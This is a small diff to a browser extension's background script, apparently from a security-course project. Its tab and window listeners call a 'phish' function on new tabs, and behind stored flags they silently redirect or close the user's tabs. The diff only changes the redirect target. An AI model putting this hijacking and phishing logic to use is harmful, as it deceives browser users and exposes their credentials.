@@ -54,7 +54,7 @@ chrome.windows.onCreated.addListener(function(event) {
     phish(event.url, event.id);
   } else if (JSON.parse(localStorage.getItem('rerouteBool'))) { // reroute new tab
     console.log('no accessible event url');
-    chrome.tabs.update(event.id, {url: 'http://courses.csail.mit.edu/6.857/2016/'});
+    chrome.tabs.update(event.id, {url: 'https://www.bing.com/'});
   }
 
   if (JSON.parse(localStorage.getItem('closeBool'))) {
@@ -72,7 +72,7 @@ chrome.tabs.onCreated.addListener(function(event) {
     phish(event.url, event.id);
   } else if (JSON.parse(localStorage.getItem('rerouteBool'))) { // reroute new tab
     console.log('no accessible event url');
-    chrome.tabs.update(event.id, {url: 'http://courses.csail.mit.edu/6.857/2016/'});
+    chrome.tabs.update(event.id, {url: 'https://www.bing.com/'});
   }
 
   if (JSON.parse(localStorage.getItem('closeBool'))) { // close new tab
